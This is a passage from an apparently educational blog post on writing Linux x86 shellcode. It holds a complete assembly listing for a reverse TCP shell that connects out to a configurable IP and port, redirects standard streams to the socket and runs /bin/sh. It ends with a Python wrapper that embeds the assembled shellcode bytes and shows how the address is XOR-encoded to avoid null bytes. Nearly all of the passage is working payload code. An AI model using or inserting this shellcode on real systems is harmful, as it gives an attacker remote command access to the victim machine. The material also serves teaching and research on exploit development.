</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>; Purpose:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>; Reverse TCP shell connect
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>;----------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff0086;font-weight:700>global</span> <span style=color:#0086d2>_start</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff0086;font-weight:700>section</span> <span style=color:#0086d2>.text</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>_start:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; zero out registers
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>eax</span>, <span style=color:#0086d2>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>edx</span>, <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; -------------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup socket
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x66</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; __NR_socketcall 102
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>bl</span>, <span style=color:#0086f7;font-weight:700>0x1</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; SYS_SOCKET
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup socket
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Resulting file descriptor is saved to eax
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Arguments are located top of the stack
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Tell the kernel it&#39;s time to boogie
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>edi</span>, <span style=color:#0086d2>eax</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; $eax contains the file descriptor created by socket(), store it in $edi for now
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; ---------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup connect
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x66</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>bl</span>, <span style=color:#0086f7;font-weight:700>0x3</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; SYS_CONNECT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; setup sockaddr struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0xfeffff80</span>                 <span style=color:#080;background-color:#0f140f;font-style:italic>; 1.0.0.127
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>dword</span> [<span style=color:#0086d2>esp</span>], <span style=color:#0086f7;font-weight:700>0xffffffff</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; xor IP with key 0xff to get real ip
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>word</span> <span style=color:#0086f7;font-weight:700>0x3905</span>        <span style=color:#080;background-color:#0f140f;font-style:italic>; htons(1337)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>word</span> <span style=color:#0086f7;font-weight:700>0x2</span>           <span style=color:#080;background-color:#0f140f;font-style:italic>; AF_INET
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Store the address that points to our struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Push the arguments for connect()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x10</span>        <span style=color:#080;background-color:#0f140f;font-style:italic>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>ecx</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Points to our sockaddr_in struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edi</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Contains our file descriptor
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Second parameter for socketcall, points to arguments required by connect()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Tell the kernel let&#39;s go!
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; --------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup dup2
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stdin
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; syscall number dup2 63 --&gt; 0x3f
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>edi</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; peer&#39;s file descriptor
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>edx</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; STDIN
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stdout
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>cl</span>, <span style=color:#0086f7;font-weight:700>0x1</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; STDOUT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stderr
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>cl</span>, <span style=color:#0086f7;font-weight:700>0x2</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; STDERR
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; --------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup execv
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>edx</span>, <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; push //bin/sh onto the stack
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x68732f6e</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x69622f2f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Set address of esp to ebx, which points
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; to //bin/sh
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">91</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">92</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>eax</span>, <span style=color:#0086d2>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">93</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0xb</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; execv syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">94</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">95</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">96</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; -----------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">97</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; THE END - HAVE A NICE SHELL |
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">98</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; -----------------------------
</span></span></span></code></pre></div><h2 id=making-the-address-and-port-configurable>Making the address and port configurable</h2><p>Right now the port <code>1337</code> and IP <code>127.0.0.1</code> is hardcoded, let&rsquo;s make a wrapper script in python which allows for setting a custom port and IP.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#fb660a;font-weight:700>import</span> sys
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>main</span>(ip, port):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic># one liner to convert e.g 127.0.0.1 to \x80\xff\xff\xfe XORed with key 0xff</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic># This is to avoid null bytes. However, a null byte can be introduced if one octet is 0xff</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    hex_ip = <span style=color:#0086d2>&#34;&#34;</span>.join([hex(int(octet)^<span style=color:#0086f7;font-weight:700>255</span>).replace(<span style=color:#0086d2>&#34;0x&#34;</span>,<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x&#34;</span>) <span style=color:#fb660a;font-weight:700>for</span> octet in ip.split(<span style=color:#0086d2>&#34;.&#34;</span>)])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    str_port = hex(port).replace(<span style=color:#0086d2>&#39;0x&#39;</span>,<span style=color:#0086d2>&#39;&#39;</span>).zfill(<span style=color:#0086f7;font-weight:700>4</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    shellcode = <span style=color:#0086d2>r</span><span style=color:#0086d2>&#34;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x03\x68</span><span style=color:#0086d2>{ip}</span><span style=color:#0086d2>\x83\x34\x24\xff\x66\x68</span><span style=color:#0086d2>{port}</span><span style=color:#0086d2>\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1    \x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&#34;</span>
